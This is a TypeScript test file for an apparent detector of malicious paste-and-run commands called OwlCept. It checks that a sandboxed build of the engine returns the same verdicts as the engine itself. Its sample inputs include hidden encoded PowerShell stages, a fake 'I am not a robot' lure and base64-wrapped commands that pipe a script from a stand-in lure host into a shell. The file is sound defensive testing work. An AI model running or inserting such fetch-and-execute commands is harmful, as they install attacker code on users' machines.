// Runs the embedded-host bundle in a bare V8 context (no atob, URL,
// TextDecoder or performance), the same conditions it meets inside the
// Windows agent, and checks it agrees with the engine run directly.

import { test, before } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { analyze } from '../src/index.ts';
import { LURE_HOST, STAGE, encodePs } from './helpers.ts';

type HostApi = { analyzeJson(json: string): string; normalizeForHash(s: string): string };
let host: HostApi;

before(() => {
  const dir = new URL('..', import.meta.url).pathname;
  execFileSync(process.execPath, ['build-host.mjs'], { cwd: dir, stdio: 'ignore' });
  const code = readFileSync(`${dir}dist/owlcept-engine.js`, 'utf8');
  const sandbox = vm.createContext({});
  for (const api of ['atob', 'URL', 'URLSearchParams', 'TextDecoder', 'performance']) {
    assert.equal(vm.runInContext(`typeof ${api}`, sandbox), 'undefined', `${api} should be missing in the bare context`);
  }
  vm.runInContext(code, sandbox);
  host = vm.runInContext('OwlCept', sandbox) as HostApi;
});

const SAMPLES: [string, object][] = [
  [`powershell -w hidden -enc ${encodePs(STAGE)}`, { target: 'run' }],
  [`powershell -c "${STAGE}" # I am not a robot`, { target: 'run' }],
  ['irm get.scoop.sh | iex', { target: 'terminal' }],
  ['curl -fsSL https://get.sometool.dev/i.sh | sh', { custody: { originUrl: 'https://sometool.dev/docs', visibleMatch: true } }],
  [`http://localhost:8400/?code=0.AXEA${'x'.repeat(120)}&state=a`, { target: 'web' }],
  ['echo ' + Buffer.from(`curl -s https://${LURE_HOST}/i.sh | bash`).toString('base64') + ' | base64 -d | bash', {}],
  ['git status', {}],
];

test('host bundle gives the same verdicts as the engine', () => {
  for (const [text, context] of SAMPLES) {
    const direct = analyze(text, context);
    const viaHost = JSON.parse(host.analyzeJson(JSON.stringify({ text, context, lang: 'hi' })));
    assert.equal(viaHost.verdict.action, direct.action, text);
    assert.equal(viaHost.verdict.risk, direct.risk, text);
    assert.deepEqual(viaHost.verdict.hosts, direct.hosts, text);
    assert.ok(viaHost.explanation.headline.length > 0);
  }
});

test('host bundle normalises for hashing the same way', () => {
  assert.equal(host.normalizeForHash('a  b\r\n c'), 'a b\nc');
});

test('polyfilled TextDecoder handles UTF-8 and UTF-16LE', () => {
  const hindi = 'रोका गया';
  const v = JSON.parse(host.analyzeJson(JSON.stringify({ text: `powershell -enc ${encodePs(`echo ${hindi}; ${STAGE}`)}` })));
  assert.ok(v.verdict.layers.some((l: string) => l.includes(hindi)));
  const u8 = JSON.parse(host.analyzeJson(JSON.stringify({ text: `echo ${Buffer.from(`echo ${hindi} && curl -s https://${LURE_HOST}/x | sh`).toString('base64')} | base64 -d | sh` })));
  assert.ok(u8.verdict.layers.some((l: string) => l.includes(hindi)));
});
